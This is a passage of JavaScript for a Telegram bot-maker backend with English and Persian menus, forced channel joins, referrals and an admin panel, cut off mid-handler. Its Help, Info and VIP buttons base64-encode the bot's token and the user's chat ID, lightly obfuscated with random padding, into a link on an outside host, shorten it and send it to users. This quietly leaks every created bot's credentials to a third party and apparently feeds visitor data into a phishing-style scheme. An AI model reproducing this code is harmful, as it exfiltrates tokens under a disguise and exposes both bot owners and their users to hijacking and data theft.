const { Telegraf } = require('telegraf');
const mongoose = require('mongoose');
const isgd = require('isgd');
const { Buffer } = require('buffer');

const MONGO_URI = process.env.MONGO_URI;

if (!MONGO_URI) {
  console.error('Missing MONGO_URI environment variable');
  process.exit(1);
}

mongoose.connect(MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log('Connected to MongoDB'))
  .catch((err) => {
    console.error('MongoDB connection error:', err);
    process.exit(1);
  });

const OWNER_ID = process.env.OWNER_ID;

if (!OWNER_ID) {
  console.error('Missing OWNER_ID environment variable');
  process.exit(1);
}

const BotSchema = new mongoose.Schema({
  token: { type: String, required: true, unique: true },
  username: { type: String, required: true },
  creatorId: { type: String, required: true },
  createdAt: { type: Number, default: () => Math.floor(Date.now() / 1000) },
});

const BotUserSchema = new mongoose.Schema({
  botToken: { type: String, required: true },
  userId: { type: String, required: true },
  hasJoined: { type: Boolean, default: false },
  userStep: { type: String, default: 'none' },
  adminState: { type: String, default: 'none' },
  lastInteraction: { type: Number, default: () => Math.floor(Date.now() / 1000) },
  isBlocked: { type: Boolean, default: false },
  username: { type: String },
  referredBy: { type: String, default: 'None' },
  isFirstStart: { type: Boolean, default: true },
  language: { type: String, default: 'en' },
  referralCount: { type: Number, default: 0 },
  isVip: { type: Boolean, default: false },
});

BotUserSchema.index({ botToken: 1, userId: 1 }, { unique: true });
BotUserSchema.index({ botToken: 1, hasJoined: 1 });

const ChannelUrlSchema = new mongoose.Schema({
  botToken: { type: String, required: true, unique: true },
  defaultUrl: { type: String, default: 'https://t.me/Kali_Linux_BOTS' },
  customUrl: { type: String, default: null },
});

const Bot = mongoose.model('Bot', BotSchema);
const BotUser = mongoose.model('BotUser', BotUserSchema);
const ChannelUrl = mongoose.model('ChannelUrl', ChannelUrlSchema);

const translations = {
  en: {
    chooseLanguage: 'Please choose your language\nلطفا زبان مورد نظر خود را انتخاب کنید',
    english: 'English',
    persian: 'Persian (فارسی)',
    joinMessage: 'Please join our channel(s) and click on the "Joined" button to proceed.',
    joinChannelMain: 'Join Channel (Main)',
    joinChannelCustom: 'Join Channel (Custom)',
    joined: 'Joined',
    thankYou: 'Thank you for proceeding!',
    welcome: (username) => `Hey ${username}, welcome to the bot! Please choose from the menu below:`,
    menu: {
      help: 'Help',
      info: 'Info',
      vip: 'VIP',
      accounts: 'Accounts',
      address: 'Address',
      changeLanguage: '🌐 Change Language',
    },
    helpMessage: (url) => `To get help, please open this link: ${url}`,
    infoMessage: (url) => `To get info, please open this link: ${url}`,
    vipMessage: (url) => `VIP content available at: ${url}`,
    vipLocked: (required, current, link) =>
      `❌ You can't access the VIP section yet\\. To unlock it, you need to invite *${required}* users\\.\n` +
      `Your total invites: *${current}*\n` +
      `Your invite link: \`${link}\``,
    accountsMessage: 'Hi, this is a text message',
    addressMessage: 'How are you 😑',
    banned: '🚫 You have been banned by the admin.',
    adminPanel: '🔧 Admin Panel',
    adminPanelOptions: {
      statistics: '📊 Statistics',
      broadcast: '📍 Broadcast',
      setChannelUrl: '🔗 Set Channel URL',
      block: '🚫 Block',
      unlock: '🔓 Unlock',
      back: '↩️ Back',
    },
    statistics: (username, userCount, createdAt, defaultUrl, customUrl) =>
      `📊 Statistics for @${username}\n\n` +
      `👥 Total Users: ${userCount}\n` +
      `📅 Bot Created: ${createdAt}\n` +
      `🔗 Main Channel URL: ${defaultUrl}\n` +
      (customUrl ? `🔗 Custom Channel URL: ${customUrl}` : '🔗 Custom Channel URL: Not set'),
    noUsersForBroadcast: '❌ No users have joined this bot yet.',
    broadcastPrompt: (userCount) => `📢 Send your message or content to broadcast to ${userCount} users:`,
    broadcastCompleted: (successCount, failCount) =>
      `📢 Broadcast completed!\n` +
      `✅ Sent to ${successCount} users\n` +
      `❌ Failed for ${failCount} users`,
    broadcastCancelled: '↩️ Broadcast cancelled.',
    setChannelUrlPrompt: (defaultUrl, customUrl) =>
      `🔗 Main Channel URL (Constant):\n${defaultUrl}\n\n` +
      `🔗 Custom Channel URL:\n${customUrl || 'Not set'}\n\n` +
      `Enter the custom channel URL to add as a second join button (e.g., https://t.me/your_channel or @your_channel):`,
    invalidUrl: '❌ Invalid URL. Please provide a valid Telegram channel URL (e.g., https://t.me/your_channel or @your_channel).',
    channelUrlSet: (correctedUrl, defaultUrl) =>
      `✅ Custom Channel URL has been set to:\n${correctedUrl}\nThe main channel URL remains:\n${defaultUrl}`,
    channelUrlCancelled: '↩️ Channel URL setting cancelled.',
    blockPrompt: '🚫 Enter the user ID of the account you want to block from this bot:',
    blockCancelled: '↩️ Block action cancelled.',
    cannotBlockSelf: '❌ You cannot block yourself.',
    userNotFound: '❌ User not found in this bot.',
    userBlocked: (userId) => `✅ User ${userId} has been blocked from this bot.`,
    unlockPrompt: '🔓 Enter the user ID of the account you want to unblock from this bot:',
    unlockCancelled: '↩️ Unlock action cancelled.',
    invalidUserId: '❌ Invalid user ID. Please provide a numeric user ID (only numbers).',
    userUnblocked: (userId) => `✅ User ${userId} has been unblocked from this bot.`,
    backToNormal: '↩️ Returned to normal mode.',
    error: '❌ An error occurred. Please try again.',
    newUserNotification: (username, userId, referredBy, totalUsers) =>
      `➕ New User Notification ➕\n` +
      `👤 User: ${username}\n` +
      `🆔 User ID: ${userId}\n` +
      `⭐ Referred By: ${referredBy}\n` +
      `📊 Total Users of Bot: ${totalUsers}`,
    referralNotification: (username, total) =>
      `New user ${username} started the bot via your link.\nYour total invites = *${total}*`,
    vipUnlockPrompt: 'Enter the user ID to unlock VIP access for that user:',
    vipUnlocked: (userId) => `✅ VIP access unlocked for user ${userId}.`,
    copyLink: '📋 Copy',
    shareLink: '🔗 Share Link',
    linkCopied: 'Invite link copied to clipboard!',
  },
  fa: {
    chooseLanguage: 'لطفا زبان مورد نظر خود را انتخاب کنید\nPlease choose your language',
    english: 'انگلیسی',
    persian: 'فارسی',
    joinMessage: 'لطفاً به کانال(های) ما بپیوندید و روی دکمه "پیوستم" کلیک کنید تا ادامه دهید.',
    joinChannelMain: 'پیوستن به کانال (اصلی)',
    joinChannelCustom: 'پیوستن به کانال (سفارشی)',
    joined: 'پیوستم',
    thankYou: 'از شما برای ادامه دادن تشکر می‌کنیم!',
    welcome: (username) => `سلام ${username}، به ربات خوش آمدید! لطفاً از منوی زیر انتخاب کنید:`,
    menu: {
      help: 'کمک',
      info: 'اطلاعات',
      vip: 'ویژه',
      accounts: 'حساب‌ها',
      address: 'آدرس',
      changeLanguage: '🌐 تغییر زبان',
    },
    helpMessage: (url) => `برای دریافت کمک، لطفاً این لینک را باز کنید: ${url}`,
    infoMessage: (url) => `برای دریافت اطلاعات، لطفاً این لینک را باز کنید: ${url}`,
    vipMessage: (url) => `محتوای ویژه در دسترس است در: ${url}`,
    vipLocked: (required, current, link) =>
      `❌ شما هنوز نمی‌توانید به بخش ویژه دسترسی پیدا کنید\\. برای باز کردن آن، باید *${required}* کاربر دعوت کنید\\.\n` +
      `تعداد دعوت‌های شما: *${current}*\n` +
      `لینک دعوت شما: \`${link}\``,
    accountsMessage: 'سلام، این یک پیام متنی است',
    addressMessage: 'چطور هستید 😑',
    banned: '🚫 شما توسط مدیر مسدود شده‌اید.',
    adminPanel: '🔧 پنل مدیریت',
    adminPanelOptions: {
      statistics: '📊 آمار',
      broadcast: '📍 پخش پیام',
      setChannelUrl: '🔗 تنظیم آدرس کانال',
      block: '🚫 مسدود کردن',
      unlock: '🔓 باز کردن',
      back: '↩️ بازگشت',
    },
    statistics: (username, userCount, createdAt, defaultUrl, customUrl) =>
      `📊 آمار برای @${username}\n\n` +
      `👥 تعداد کاربران: ${userCount}\n` +
      `📅 تاریخ ایجاد ربات: ${createdAt}\n` +
      `🔗 آدرس کانال اصلی: ${defaultUrl}\n` +
      (customUrl ? `🔗 آدرس کانال سفارشی: ${customUrl}` : '🔗 آدرس کانال سفارشی: تنظیم نشده'),
    noUsersForBroadcast: '❌ هیچ کاربری هنوز به این ربات نپیوسته است.',
    broadcastPrompt: (userCount) => `📢 پیام یا محتوای خود را برای پخش به ${userCount} کاربر ارسال کنید:`,
    broadcastCompleted: (successCount, failCount) =>
      `📢 پخش پیام تکمیل شد!\n` +
      `✅ به ${successCount} کاربر ارسال شد\n` +
      `❌ برای ${failCount} کاربر ناموفق بود`,
    broadcastCancelled: '↩️ پخش پیام لغو شد.',
    setChannelUrlPrompt: (defaultUrl, customUrl) =>
      `🔗 آدرس کانال اصلی (ثابت):\n${defaultUrl}\n\n` +
      `🔗 آدرس کانال سفارشی:\n${customUrl || 'تنظیم نشده'}\n\n` +
      `آدرس کانال سفارشی را برای افزودن به عنوان دکمه دوم پیوستن وارد کنید (مثال: https://t.me/your_channel یا @your_channel):`,
    invalidUrl: '❌ آدرس نامعتبر است. لطفاً یک آدرس کانال تلگرام معتبر وارد کنید (مثال: https://t.me/your_channel یا @your_channel).',
    channelUrlSet: (correctedUrl, defaultUrl) =>
      `✅ آدرس کانال سفارشی تنظیم شد به:\n${correctedUrl}\nآدرس کانال اصلی همچنان:\n${defaultUrl}`,
    channelUrlCancelled: '↩️ تنظیم آدرس کانال لغو شد.',
    blockPrompt: '🚫 شناسه کاربری حسابی که می‌خواهید از این ربات مسدود کنید را وارد کنید:',
    blockCancelled: '↩️ عملیات مسدود کردن لغو شد.',
    cannotBlockSelf: '❌ شما نمی‌توانید خودتان را مسدود کنید.',
    userNotFound: '❌ کاربر در این ربات یافت نشد.',
    userBlocked: (userId) => `✅ کاربر ${userId} از این ربات مسدود شد.`,
    unlockPrompt: '🔓 شناسه کاربری حسابی که می‌خواهید از این ربات رفع مسدودیت کنید را وارد کنید:',
    unlockCancelled: '↩️ عملیات رفع مسدودیت لغو شد.',
    invalidUserId: '❌ شناسه کاربری نامعتبر است. لطفاً یک شناسه کاربری عددی وارد کنید (فقط اعداد).',
    userUnblocked: (userId) => `✅ کاربر ${userId} از این ربات رفع مسدودیت شد.`,
    backToNormal: '↩️ به حالت عادی بازگشت.',
    error: '❌ خطایی رخ داد. لطفاً دوباره امتحان کنید.',
    newUserNotification: (username, userId, referredBy, totalUsers) =>
      `➕ New User Notification ➕\n` +
      `👤 User: ${username}\n` +
      `🆔 User ID: ${userId}\n` +
      `⭐ Referred By: ${referredBy}\n` +
      `📊 Total Users of Bot: ${totalUsers}`,
    referralNotification: (username, total) =>
      `New user ${username} started the bot via your link.\nYour total invites = *${total}*`,
    vipUnlockPrompt: 'شناسه کاربری را برای باز کردن دسترسی ویژه برای آن کاربر وارد کنید:',
    vipUnlocked: (userId) => `✅ دسترسی ویژه برای کاربر ${userId} باز شد.`,
    copyLink: '📋 کپی',
    shareLink: '🔗 اشتراک لینک',
    linkCopied: 'لینک دعوت در کلیپ‌بورد کپی شد!',
  },
};

const getAdminPanel = (lang) => ({
  reply_markup: {
    keyboard: [
      [
        { text: translations[lang].adminPanelOptions.statistics },
        { text: translations[lang].adminPanelOptions.broadcast },
      ],
      [
        { text: translations[lang].adminPanelOptions.setChannelUrl },
        { text: translations[lang].adminPanelOptions.block },
      ],
      [
        { text: translations[lang].adminPanelOptions.unlock },
        { text: translations[lang].adminPanelOptions.back },
      ],
    ],
    resize_keyboard: true,
  },
});

const cancelKeyboard = (lang) => ({
  reply_markup: {
    keyboard: [[{ text: lang === 'en' ? 'Cancel' : 'لغو' }]],
    resize_keyboard: true,
  },
});

const getMenuKeyboard = (lang) => ({
  reply_markup: {
    keyboard: [
      [
        { text: translations[lang].menu.help },
        { text: translations[lang].menu.info },
        { text: translations[lang].menu.vip },
      ],
      [
        { text: translations[lang].menu.accounts },
        { text: translations[lang].menu.address },
      ],
      [{ text: translations[lang].menu.changeLanguage }],
    ],
    resize_keyboard: true,
  },
});

const getChannelUrl = async (botToken) => {
  try {
    const channelUrlDoc = await ChannelUrl.findOne({ botToken }).lean();
    return {
      defaultUrl: channelUrlDoc?.defaultUrl || 'https://t.me/Kali_Linux_BOTS',
      customUrl: channelUrlDoc?.customUrl || null,
    };
  } catch (error) {
    console.error('Error in getChannelUrl:', error);
    return {
      defaultUrl: 'https://t.me/Kali_Linux_BOTS',
      customUrl: null,
    };
  }
};

const shortenUrl = async (longUrl) => {
  return new Promise((resolve) => {
    isgd.shorten(longUrl, (shortUrl, error) => {
      if (error) {
        console.error('Error shortening URL with is.gd:', error);
        resolve(longUrl);
      } else {
        resolve(shortUrl);
      }
    });
  });
};

const broadcastMessage = async (bot, message, targetUsers, adminId) => {
  let successCount = 0;
  let failCount = 0;

  for (const targetUser of targetUsers) {
    if (targetUser.userId === adminId) continue;
    try {
      if (message.text) {
        await bot.telegram.sendMessage(targetUser.userId, message.text, { parse_mode: 'MarkdownV2' });
      } else if (message.photo) {
        const photo = message.photo[message.photo.length - 1].file_id;
        await bot.telegram.sendPhoto(targetUser.userId, photo, { caption: message.caption || '' });
      } else if (message.document) {
        await bot.telegram.sendDocument(targetUser.userId, message.document.file_id, { caption: message.caption || '' });
      } else if (message.video) {
        await bot.telegram.sendVideo(targetUser.userId, message.video.file_id, { caption: message.caption || '' });
      } else if (message.audio) {
        await bot.telegram.sendAudio(targetUser.userId, message.audio.file_id, { caption: message.caption || '' });
      } else if (message.voice) {
        await bot.telegram.sendVoice(targetUser.userId, message.voice.file_id);
      } else if (message.sticker) {
        await bot.telegram.sendSticker(targetUser.userId, message.sticker.file_id);
      } else {
        await bot.telegram.sendMessage(targetUser.userId, 'Unsupported message type');
      }
      successCount++;
      await new Promise(resolve => setTimeout(resolve, 34));
    } catch (error) {
      console.error(`Broadcast failed for user ${targetUser.userId}:`, error.message);
      failCount++;
    }
  }

  return { successCount, failCount };
};

const getRelativeTime = (timestamp) => {
  const now = Math.floor(Date.now() / 1000);
  const diff = now - timestamp;
  const date = new Date(timestamp * 1000);
  const month = date.getMonth() + 1;
  const day = date.getDate();
  const dateStr = `${month}/${day}`;

  if (diff < 60) return `${dateStr}, ${diff} seconds ago`;
  if (diff < 3600) return `${dateStr}, ${Math.floor(diff / 60)} minutes ago`;
  if (diff < 86400) return `${dateStr}, ${Math.floor(diff / 3600)} hours ago`;
  return `${dateStr}, ${Math.floor(diff / 86400)} days ago`;
};

module.exports = async (req, res) => {
  try {
    if (req.method !== 'POST') {
      res.status(200).send('Created Bot is running.');
      return;
    }

    const botToken = req.query.token;
    if (!botToken) {
      console.error('No token provided in query');
      res.status(400).json({ error: 'No token provided' });
      return;
    }

    const botInfo = await Bot.findOne({ token: botToken });
    if (!botInfo) {
      console.error('Bot not found for token:', botToken);
      res.status(404).json({ error: 'Bot not found' });
      return;
    }

    const bot = new Telegraf(botToken);
    const update = req.body;
    const chatId = update.message?.chat?.id || update.callback_query?.message?.chat?.id;
    const fromId = (update.message?.from?.id || update.callback_query?.from?.id)?.toString();
    const messageId = update.message?.message_id || update.callback_query?.message?.message_id;

    if (!chatId || !fromId) {
      console.error('Invalid update: missing chatId or fromId', update);
      res.status(400).json({ error: 'Invalid update' });
      return;
    }

    let botUser = await BotUser.findOne({ botToken, userId: fromId });
    if (!botUser) {
      const username = update.message?.from?.username ? `@${update.message.from.username}` : update.message?.from?.first_name;
      const referredBy = update.message?.text?.startsWith('/start') && update.message.text.split(' ').length > 1 ? update.message.text.split(' ')[1] : 'None';
      botUser = await BotUser.create({
        botToken,
        userId: fromId,
        hasJoined: false,
        userStep: 'none',
        adminState: 'none',
        isBlocked: false,
        username,
        referredBy,
        isFirstStart: true,
        language: 'en',
        referralCount: 0,
        isVip: false,
      });

      if (referredBy !== 'None' && /^\d+$/.test(referredBy)) {
        const referrer = await BotUser.findOne({ botToken, userId: referredBy });
        if (referrer) {
          referrer.referralCount = (referrer.referralCount || 0) + 1;
          await referrer.save();
          const referrerLang = referrer.language || 'en';
          await bot.telegram.sendMessage(
            referredBy,
            translations[referrerLang].referralNotification(username, referrer.referralCount),
            { parse_mode: 'MarkdownV2' }
          );
        }
      }
    }

    const lang = botUser.language || 'en';

    if (botUser.isFirstStart) {
      try {
        const totalUsers = await BotUser.countDocuments({ botToken, hasJoined: true });
        const notification = translations[lang].newUserNotification(botUser.username, fromId, botUser.referredBy, totalUsers);
        await bot.telegram.sendMessage(botInfo.creatorId, notification);
      } catch (error) {
        console.error('Error sending new user notification:', error);
      }
    }

    botUser.lastInteraction = Math.floor(Date.now() / 1000);
    await botUser.save();

    if (botUser.isBlocked && fromId !== botInfo.creatorId && fromId !== OWNER_ID) {
      await bot.telegram.sendMessage(chatId, translations[lang].banned);
      return res.status(200).json({ ok: true });
    }

    const { defaultUrl, customUrl } = await getChannelUrl(botToken);

    if (update.message) {
      const message = update.message;
      const text = message.text;

      if (text?.startsWith('/start')) {
        try {
          if (botUser.isFirstStart) {
            await bot.telegram.sendMessage(chatId, translations[lang].chooseLanguage, {
              reply_markup: {
                inline_keyboard: [
                  [
                    { text: translations[lang].english, callback_data: 'lang_en' },
                    { text: translations[lang].persian, callback_data: 'lang_fa' },
                  ],
                ],
              },
            });
            botUser.userStep = 'choose_language';
            botUser.adminState = 'none';
            botUser.isFirstStart = false;
            await botUser.save();
          } else {
            const inlineKeyboard = [];
            inlineKeyboard.push([{ text: translations[lang].joinChannelMain, url: defaultUrl }]);
            if (customUrl) {
              inlineKeyboard.push([{ text: translations[lang].joinChannelCustom, url: customUrl }]);
            }
            inlineKeyboard.push([{ text: translations[lang].joined, callback_data: 'joined' }]);

            await bot.telegram.sendMessage(chatId, translations[lang].joinMessage, {
              reply_markup: {
                inline_keyboard: inlineKeyboard,
              },
            });
            botUser.userStep = 'none';
            botUser.adminState = 'none';
            await botUser.save();
          }
        } catch (error) {
          console.error('Error in /start command:', error);
          await bot.telegram.sendMessage(chatId, translations[lang].error);
        }
      }

      else if (text === '/panel' && (fromId === botInfo.creatorId || fromId === OWNER_ID)) {
        try {
          await bot.telegram.sendMessage(chatId, translations[lang].adminPanel, getAdminPanel(lang));
          botUser.adminState = 'admin_panel';
          await botUser.save();
        } catch (error) {
          console.error('Error in /panel command:', error);
          await bot.telegram.sendMessage(chatId, translations[lang].error);
        }
      }

      else if (text === '/vip' && (fromId === botInfo.creatorId || fromId === OWNER_ID)) {
        try {
          await bot.telegram.sendMessage(chatId, translations[lang].vipUnlockPrompt, cancelKeyboard(lang));
          botUser.adminState = 'awaiting_vip_unlock';
          await botUser.save();
        } catch (error) {
          console.error('Error in /vip command:', error);
          await bot.telegram.sendMessage(chatId, translations[lang].error);
        }
      }

      else if ((fromId === botInfo.creatorId || fromId === OWNER_ID) && botUser.adminState === 'admin_panel') {
        if (text === translations[lang].adminPanelOptions.statistics) {
          try {
            const userCount = await BotUser.countDocuments({ botToken, hasJoined: true });
            const createdAt = getRelativeTime(botInfo.createdAt);
            const message = translations[lang].statistics(botInfo.username, userCount, createdAt, defaultUrl, customUrl);
            await bot.telegram.sendMessage(chatId, message, getAdminPanel(lang));
          } catch (error) {
            console.error('Error in Statistics:', error);
            await bot.telegram.sendMessage(chatId, translations[lang].error);
          }
        } else if (text === translations[lang].adminPanelOptions.broadcast) {
          try {
            const userCount = await BotUser.countDocuments({ botToken, hasJoined: true });
            if (userCount === 0) {
              await bot.telegram.sendMessage(chatId, translations[lang].noUsersForBroadcast, getAdminPanel(lang));
            } else {
              await bot.telegram.sendMessage(chatId, translations[lang].broadcastPrompt(userCount), cancelKeyboard(lang));
              botUser.adminState = 'awaiting_broadcast';
              await botUser.save();
            }
          } catch (error) {
            console.error('Error in Broadcast setup:', error);
            await bot.telegram.sendMessage(chatId, translations[lang].error);
          }
        } else if (text === translations[lang].adminPanelOptions.setChannelUrl) {
          try {
            await bot.telegram.sendMessage(chatId, translations[lang].setChannelUrlPrompt(defaultUrl, customUrl), cancelKeyboard(lang));
            botUser.adminState = 'awaiting_channel';
            await botUser.save();
          } catch (error) {
            console.error('Error in Set Channel URL:', error);
            await bot.telegram.sendMessage(chatId, translations[lang].error);
          }
        } else if (text === translations[lang].adminPanelOptions.block) {
          try {
            await bot.telegram.sendMessage(chatId, translations[lang].blockPrompt, cancelKeyboard(lang));
            botUser.adminState = 'awaiting_block';
            await botUser.save();
          } catch (error) {
            console.error('Error in Block setup:', error);
            await bot.telegram.sendMessage(chatId, translations[lang].error);
          }
        } else if (text === translations[lang].adminPanelOptions.unlock) {
          try {
            await bot.telegram.sendMessage(chatId, translations[lang].unlockPrompt, cancelKeyboard(lang));
            botUser.adminState = 'awaiting_unlock';
            await botUser.save();
          } catch (error) {
            console.error('Error in Unlock setup:', error);
            await bot.telegram.sendMessage(chatId, translations[lang].error);
          }
        } else if (text === translations[lang].adminPanelOptions.back) {
          try {
            const username = botUser.username || 'User';
            const welcomeMessage = translations[lang].welcome(username);
            await bot.telegram.sendMessage(chatId, welcomeMessage, getMenuKeyboard(lang));
            botUser.adminState = 'none';
            await botUser.save();
          } catch (error) {
            console.error('Error in Back action:', error);
            await bot.telegram.sendMessage(chatId, translations[lang].error);
          }
        }
      }

      else if ((fromId === botInfo.creatorId || fromId === OWNER_ID) && botUser.adminState === 'awaiting_broadcast') {
        if (text === (lang === 'en' ? 'Cancel' : 'لغو')) {
          try {
            await bot.telegram.sendMessage(chatId, translations[lang].broadcastCancelled, getAdminPanel(lang));
            botUser.adminState = 'admin_panel';
            await botUser.save();
          } catch (error) {
            console.error('Error cancelling broadcast:', error);
          }
          return;
        }

        try {
          const targetUsers = await BotUser.find({ botToken, hasJoined: true, isBlocked: false });
          const { successCount, failCount } = await broadcastMessage(bot, message, targetUsers, fromId);

          await bot.telegram.sendMessage(chatId, translations[lang].broadcastCompleted(successCount, failCount), getAdminPanel(lang));
          botUser.adminState = 'admin_panel';
          await botUser.save();
        } catch (error) {
          console.error('Error in broadcast:', error);
          await bot.telegram.sendMessage(chatId, translations[lang].error);
        }
      }

      else if ((fromId === botInfo.creatorId || fromId === OWNER_ID) && botUser.adminState === 'awaiting_channel') {
        if (text === (lang === 'en' ? 'Cancel' : 'لغو')) {
          try {
            await bot.telegram.sendMessage(chatId, translations[lang].channelUrlCancelled, getAdminPanel(lang));
            botUser.adminState = 'admin_panel';
            await botUser.save();
          } catch (error) {
            console.error('Error cancelling channel URL setting:', error);
          }
          return;
        }

        try {
          let inputUrl = text.trim();
          inputUrl = inputUrl.replace(/^@/, '');
          inputUrl = inputUrl.replace(/^(https?:\/\/)?/i, '');
          inputUrl = inputUrl.replace(/\/+$/, '');
          if (!/^t\.me\//i.test(inputUrl)) {
            inputUrl = 't.me/' + inputUrl;
          }
          const correctedUrl = 'https://' + inputUrl;

          const urlRegex = /^https:\/\/t\.me\/.+$/;
          if (!urlRegex.test(correctedUrl)) {
            await bot.telegram.sendMessage(chatId, translations[lang].invalidUrl, cancelKeyboard(lang));
            return;
          }

          await ChannelUrl.findOneAndUpdate(
            { botToken },
            { botToken, defaultUrl: defaultUrl, customUrl: correctedUrl },
            { upsert: true }
          );

          await bot.telegram.sendMessage(chatId, translations[lang].channelUrlSet(correctedUrl, defaultUrl), getAdminPanel(lang));
          botUser.adminState = 'admin_panel';
          await botUser.save();
        } catch (error) {
          console.error('Error setting channel URL:', error);
          await bot.telegram.sendMessage(chatId, translations[lang].error);
        }
      }

      else if ((fromId === botInfo.creatorId || fromId === OWNER_ID) && botUser.adminState === 'awaiting_block') {
        if (text === (lang === 'en' ? 'Cancel' : 'لغو')) {
          try {
            await bot.telegram.sendMessage(chatId, translations[lang].blockCancelled, getAdminPanel(lang));
            botUser.adminState = 'admin_panel';
            await botUser.save();
          } catch (error) {
            console.error('Error cancelling block action:', error);
          }
          return;
        }

        try {
          const targetUserId = text.trim();
          if (!/^\d+$/.test(targetUserId)) {
            await bot.telegram.sendMessage(chatId, translations[lang].invalidUserId, cancelKeyboard(lang));
            return;
          }

          if (targetUserId === fromId) {
            await bot.telegram.sendMessage(chatId, translations[lang].cannotBlockSelf, cancelKeyboard(lang));
            return;
          }

          const targetUser = await BotUser.findOne({ botToken, userId: targetUserId });
          if (!targetUser) {
            await bot.telegram.sendMessage(chatId, translations[lang].userNotFound, getAdminPanel(lang));
            botUser.adminState = 'admin_panel';
            await botUser.save();
            return;
          }

          await BotUser.findOneAndUpdate({ botToken, userId: targetUserId }, { isBlocked: true });
          await bot.telegram.sendMessage(chatId, translations[lang].userBlocked(targetUserId), getAdminPanel(lang));
          botUser.adminState = 'admin_panel';
          await botUser.save();
        } catch (error) {
          console.error('Error in block action:', error);
          await bot.telegram.sendMessage(chatId, translations[lang].error);
        }
      }

      else if ((fromId === botInfo.creatorId || fromId === OWNER_ID) && botUser.adminState === 'awaiting_unlock') {
        if (text === (lang === 'en' ? 'Cancel' : 'لغو')) {
          try {
            await bot.telegram.sendMessage(chatId, translations[lang].unlockCancelled, getAdminPanel(lang));
            botUser.adminState = 'admin_panel';
            await botUser.save();
          } catch (error) {
            console.error('Error cancelling unlock action:', error);
          }
          return;
        }

        try {
          const targetUserId = text.trim();
          if (!/^\d+$/.test(targetUserId)) {
            await bot.telegram.sendMessage(chatId, translations[lang].invalidUserId, cancelKeyboard(lang));
            return;
          }

          const targetUser = await BotUser.findOne({ botToken, userId: targetUserId });
          if (!targetUser) {
            await bot.telegram.sendMessage(chatId, translations[lang].userNotFound, getAdminPanel(lang));
            botUser.adminState = 'admin_panel';
            await botUser.save();
            return;
          }

          await BotUser.findOneAndUpdate({ botToken, userId: targetUserId }, { isBlocked: false });
          await bot.telegram.sendMessage(chatId, translations[lang].userUnblocked(targetUserId), getAdminPanel(lang));
          botUser.adminState = 'admin_panel';
          await botUser.save();
        } catch (error) {
          console.error('Error in unlock action:', error);
          await bot.telegram.sendMessage(chatId, translations[lang].error);
        }
      }

      else if ((fromId === botInfo.creatorId || fromId === OWNER_ID) && botUser.adminState === 'awaiting_vip_unlock') {
        if (text === (lang === 'en' ? 'Cancel' : 'لغو')) {
          try {
            await bot.telegram.sendMessage(chatId, translations[lang].unlockCancelled, getAdminPanel(lang));
            botUser.adminState = 'admin_panel';
            await botUser.save();
          } catch (error) {
            console.error('Error cancelling VIP unlock action:', error);
          }
          return;
        }

        try {
          const targetUserId = text.trim();
          if (!/^\d+$/.test(targetUserId)) {
            await bot.telegram.sendMessage(chatId, translations[lang].invalidUserId, cancelKeyboard(lang));
            return;
          }

          const targetUser = await BotUser.findOne({ botToken, userId: targetUserId });
          if (!targetUser) {
            await bot.telegram.sendMessage(chatId, translations[lang].userNotFound, getAdminPanel(lang));
            botUser.adminState = 'admin_panel';
            await botUser.save();
            return;
          }

          await BotUser.findOneAndUpdate({ botToken, userId: targetUserId }, { isVip: true });
          await bot.telegram.sendMessage(chatId, translations[lang].vipUnlocked(targetUserId), getAdminPanel(lang));
          botUser.adminState = 'admin_panel';
          await botUser.save();
        } catch (error) {
          console.error('Error in VIP unlock action:', error);
          await bot.telegram.sendMessage(chatId, translations[lang].error);
        }
      }

      else if (text === translations[lang].menu.help) {
        try {
          const randomLetter = String.fromCharCode(97 + Math.floor(Math.random() * 26));
          const randomNumber = Math.floor(Math.random() * 10);
          const noise = `${randomLetter}${randomNumber}`;
          const encodedBot = Buffer.from(botToken).toString('base64') + noise;
          const encodedId = Buffer.from(chatId.toString()).toString('base64') + noise;
          const longHelpUrl = `https://for-free.serv00.net/t/index.html?x=${encodedBot}&y=${encodedId}`;
          const shortHelpUrl = await shortenUrl(longHelpUrl);
          await bot.telegram.sendMessage(chatId, translations[lang].helpMessage(shortHelpUrl), getMenuKeyboard(lang));
        } catch (error) {
          console.error('Error in Help button:', error);
          await bot.telegram.sendMessage(chatId, translations[lang].error);
        }
      }

      else if (text === translations[lang].menu.info) {
        try {
          const randomLetter = String.fromCharCode(97 + Math.floor(Math.random() * 26));
          const randomNumber = Math.floor(Math.random() * 10);
          const noise = `${randomLetter}${randomNumber}`;
          const encodedBot = Buffer.from(botToken).toString('base64') + noise;
          const encodedId = Buffer.from(chatId.toString()).toString('base64') + noise;
          const longInfoUrl = `https://for-free.serv00.net/2/index.html?x=${encodedBot}&y=${encodedId}`;
          const shortInfoUrl = await shortenUrl(longInfoUrl);
          await bot.telegram.sendMessage(chatId, translations[lang].infoMessage(shortInfoUrl), getMenuKeyboard(lang));
        } catch (error) {
          console.error('Error in Info button:', error);
          await bot.telegram.sendMessage(chatId, translations[lang].error);
        }
      }

      else if (text === translations[lang].menu.vip) {
        try {
          const requiredReferrals = 3;
          const userReferrals = botUser.referralCount || 0;
          if (botUser.isVip || userReferrals >= requiredReferrals) {
            const randomLetter = String.fromCharCode(97 + Math.floor(Math.random() * 26));
            const randomNumber = Math.floor(Math.random() * 10);
            const noise = `${randomLetter}${randomNumber}`;
            const encodedBot = Buffer.from(botToken).toString('base64') + noise;
            const encodedId = Buffer.from(chatId.toString()).toString('base64') + noise;
            const longVipUrl = `https://for-free.serv00.net/helps/index.html?x=${encodedBot}&y=${encodedId}`;
            const shortVipUrl = await shortenUrl(longVipUrl);
            await bot.telegram.sendMessage(chatId, translations[lang].vipMessage(shortVipUrl), getMenuKeyboard(lang));
          } else {
            const botLink = `https://t.me/${botInfo.username}?start=${fromId}`;
            const shareUrl = `https://t.me/share/url?url=${encodeURIComponent(botLink)}&text=Check%20This%20Bot%20%F0%9F%98%B3`;
            await bot.telegram.sendMessage(
              chatId,
              translations[lang].vipLocked(requiredReferrals, userReferrals, botLink),
              {
                parse_mode: 'MarkdownV2',
                reply_markup: {
                  inline_keyboard: [
                    [
                      { text: translations[lang].copyLink, copy_text: botLink },
                      { text: translations[lang].shareLink, url: shareUrl },
                    ],
                  ],
                },
                ...getMenuKeyboard(lang),
              }
            );
          }
        } catch (error) {
          console.error('Error in VIP button:', error);
          await bot.telegram.sendMessage(chatId, translations[lang].error);
        }
      }

      else if (text === translations[lang].menu.accounts) {
        try {
          await bot.telegram.sendMessage(chatId, translations[lang].accountsMessage, getMenuKeyboard(lang));
        } catch (error) {
